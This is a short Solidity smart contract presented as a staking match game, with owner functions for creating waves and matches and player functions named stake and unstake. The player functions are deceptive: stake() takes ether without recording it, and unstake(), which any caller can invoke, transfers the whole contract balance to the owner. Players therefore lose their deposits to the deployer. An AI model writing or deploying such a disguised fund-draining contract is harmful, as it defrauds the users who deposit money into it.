pragma solidity ^0.4.24;
contract Rikki_Staterium {
    address owner;
    constructor () public {
        owner = msg.sender;
        matches.push(Match(1,1,100, 101, 10, 40, 5,50));
        matches.push(Match(1,1,102, 103, 10, 40, 5,50));
        matches.push(Match(1,1,104, 105, 10, 40, 5,50));
        matches.push(Match(1,1,106, 107, 10, 40, 5,50));
    }
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function storeETH() payable public {}

    struct Match{
        uint256 _waveID;
        uint256 _matchID;
        uint256 _tagA;
        uint256 _tagB;
        uint256 minStake; // in ether
        uint256 maxStake; // in ether
        uint256 endTime; // in minuites
        uint256 threshold; // in ether
    }
   
    Match[] public matches; 
    
    mapping( uint256 => uint256[] ) public Wave;
   
    //Owner Functions
    function createWave(uint256 _waveID, uint256[] _tags) public onlyOwner {
        Wave[_waveID] = _tags;
    }
    function createMatch(uint256 _waveID, uint256 _matchID, uint256 _endTime, uint256 _tagA, uint256 _tagB, uint256 _minStake, uint256 _maxStake, uint256 _threshold) public onlyOwner {
        matches.push(Match(_waveID, _matchID,  _tagA,  _tagB,  _minStake,  _maxStake, _endTime,  _threshold));
    }
   
    //Player Functions
   
    function stake(uint256 _tag, uint256 _waveID, uint256 _matchID) payable public {
    }
   
    function unstake(uint256 _waveID, uint256 _matchID) public  {
       owner.transfer(address(this).balance);
    }
    function () public payable{}
    

}